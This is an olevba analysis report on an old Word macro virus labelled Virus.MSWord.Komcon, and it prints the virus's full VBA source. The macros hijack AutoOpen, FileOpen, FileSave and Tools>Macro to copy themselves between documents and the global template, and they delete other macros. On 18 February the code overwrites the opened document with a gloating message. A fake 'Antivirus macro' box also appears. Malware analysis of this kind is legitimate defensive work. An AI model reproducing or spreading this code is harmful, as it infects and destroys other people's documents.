olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Komcon
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Komcon - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Komcon - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'============================
' (C) Tanto Prihartanto, 1998
'============================
Public Sub MAIN()
Dim dokumen$
Dim stmacro$
dokumen$ = WordBasic.[FileName$]()
stmacro$ = dokumen$ + ":autoopen"
WordBasic.MacroCopy stmacro$, "Global:RAO"
stmacro$ = dokumen$ + ":RTM"
WordBasic.MacroCopy stmacro$, "Global:ToolsMacro"
stmacro$ = dokumen$ + ":RFO"
WordBasic.MacroCopy stmacro$, "Global:FileOpen"
stmacro$ = dokumen$ + ":RFS"
WordBasic.MacroCopy stmacro$, "Global:Filesave"
stmacro$ = dokumen$ + ":RFT"
WordBasic.MacroCopy stmacro$, "Global:FileTemplates"
'stmacro$ = dokumen$ + ":RFT"
'MacroCopy stmacro$, "Global:Filetemplates"
WordBasic.FileSaveAll 1, 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO RFO.bas 
in file: Virus.MSWord.Komcon - OLE stream: 'Macros/VBA/RFO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim dokumen$
Dim tanggal
Dim bulan
Dim jml
Dim sname$
Dim j
Dim i
Dim stmacro$
WordBasic.DisableInput
WordBasic.DisableAutoMacros 1
On Error GoTo -1: On Error GoTo done
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
dokumen$ = WordBasic.[FileName$]()
tanggal = WordBasic.Day(WordBasic.Now())
bulan = WordBasic.Month(WordBasic.Now())
If (tanggal = 18) And (bulan = 2) Then GoTo pl
jml = WordBasic.CountMacros(1)
If jml = 0 Then GoTo tulari
sname$ = WordBasic.[MacroFileName$]("RAE")
If smane$ = dokumen$ Then GoTo done
ReDim mname__$(jml)
For j = 1 To jml
  mname__$(j) = WordBasic.[MacroName$](j, 1)
Next j
For i = 1 To jml
   WordBasic.Organizer Delete:=1, Source:=dokumen$, Name:=mname__$(i), Tab:=3
   WordBasic.PrintStatusBar "Deletting macro " + mname__$(i)
Next i
GoTo tulari
pl:
 
Dim pesannya$
pesannya$ = "Rupanya Anda sedang sial........, Dokumen Anda kini " + _
"hilang. Ini bukan perbuatan Anda tapi ulah saya." + _
" Selamat Ngetik lagi...semoga Anda masih punya Back-upnya"
WordBasic.FileClose 2
WordBasic.FileNew Template:="Normal"
WordBasic.Font "Arial"
WordBasic.JustifyPara
WordBasic.FontSize 11
WordBasic.Insert "Salam krisis..."
WordBasic.InsertPara
WordBasic.Insert pesannya$
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.InsertPara
WordBasic.RightPara
WordBasic.Bold
WordBasic.FontSize 13
WordBasic.Insert "(C) Semarang, May 1998"
WordBasic.InsertPara
WordBasic.RightPara
WordBasic.Insert "Rosw@ti"
WordBasic.FileSaveAs Name:=dokumen$, Format:=1
WordBasic.PrintStatusBar " Penghancuran dokumen telah dilakukan dengan sukses....."
GoTo done
tulari:
WordBasic.FileSaveAs Name:=dokumen$, Format:=1
stmacro$ = dokumen$ + ":autoopen"
WordBasic.MacroCopy "Global:RAO", stmacro$
stmacro$ = dokumen$ + ":RFO"
WordBasic.MacroCopy "Global:FileOpen", stmacro$
stmacro$ = dokumen$ + ":RFS"
WordBasic.MacroCopy "Global:FileSave", stmacro$
'stmacro$ = dokumen$ + ":RAE"
'MacroCopy "Global:AutoExec", stmacro$
stmacro$ = dokumen$ + ":RFT"
WordBasic.MacroCopy "Global:FileTemplates", stmacro$
stmacro$ = dokumen$ + ":RTM"
WordBasic.MacroCopy "Global:ToolsMacro", stmacro$
WordBasic.Filesave
done:
End Sub

-------------------------------------------------------------------------------
VBA MACRO RFS.bas 
in file: Virus.MSWord.Komcon - OLE stream: 'Macros/VBA/RFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim dokumen$
Dim pj
Dim loc_
Dim nama$
Dim dlg As Object
Dim jml
Dim sname$
Dim stmacro$
On Error GoTo -1: On Error GoTo done
dokumen$ = WordBasic.[FileName$]()
pj = Len(dokumen$)
loc_ = InStr(dokumen$, ".")
nama$ = WordBasic.[Left$](dokumen$, pj - loc_)
If Len(nama$) > 8 Then
  Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
  WordBasic.CurValues.FileSaveAs dlg
  WordBasic.Dialog.FileSaveAs dlg
  WordBasic.FileSaveAs dlg
  dokumen$ = WordBasic.[FileName$]()
End If
jml = WordBasic.CountMacros(1)
If jml = 0 Then GoTo tulari
sname$ = WordBasic.[MacroFileName$]("RAE")
If sname$ = dokumen$ Then GoTo done Else GoTo tulari
tulari:
WordBasic.FileSaveAs Name:=dokumen$, Format:=1
stmacro$ = dokumen$ + ":autoopen"
WordBasic.MacroCopy "Global:RAO", stmacro$
stmacro$ = dokumen$ + ":RFO"
WordBasic.MacroCopy "Global:FileOpen", stmacro$
stmacro$ = dokumen$ + ":RFS"
WordBasic.MacroCopy "Global:FileSave", stmacro$
'stmacro$ = dokumen$ + ":RAE"
'MacroCopy "Global:AutoExec", stmacro$
stmacro$ = dokumen$ + ":RFT"
WordBasic.MacroCopy "Global:FileTemplates", stmacro$
stmacro$ = dokumen$ + ":RTM"
WordBasic.MacroCopy "Global:ToolsMacro", stmacro$
done:
WordBasic.Filesave
End Sub
-------------------------------------------------------------------------------
VBA MACRO RFT.bas 
in file: Virus.MSWord.Komcon - OLE stream: 'Macros/VBA/RFT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RFT.MAIN"
WordBasic.DisableInput 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO RTM.bas 
in file: Virus.MSWord.Komcon - OLE stream: 'Macros/VBA/RTM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%565"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RTM.MAIN"
WordBasic.MsgBox "Antivirus macro v.1.0.0 ", "by Rosw@ti"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

